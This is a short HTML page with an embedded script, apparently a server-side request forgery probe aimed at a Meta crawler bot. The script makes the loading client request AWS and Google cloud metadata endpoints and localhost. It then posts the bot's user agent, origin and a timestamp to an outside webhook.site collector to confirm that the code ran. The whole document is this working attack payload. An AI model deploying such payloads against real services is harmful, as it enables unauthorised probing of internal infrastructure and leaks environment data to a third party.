<!DOCTYPE html>
<html>
<body>
    <h2>SSRF Meta</h2>
    <script>
        // 1. Intentar leer los metadatos de la nube (SSRF)
        const targets = [
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://localhost:8080/"
        ];

        targets.forEach(url => {
            fetch(url, { mode: 'no-cors' })
                .then(() => console.log("SSRF intentado: " + url))
                .catch(() => console.log("Falló SSRF: " + url));
        });

        // 2. Confirmar la ejecución con el bot de Meta
        fetch("https://webhook.site/e989aff5-a038-4481-bc10-b96b2a2cafde?bot_executed=true", {
            method: "POST",
            mode: "no-cors",
            body: JSON.stringify({
                // Enviamos datos del entorno del bot
                userAgent: navigator.userAgent,
                origin: window.location.origin,
                time: new Date().toISOString()
            })
        });
    </script>
</body>
</html>
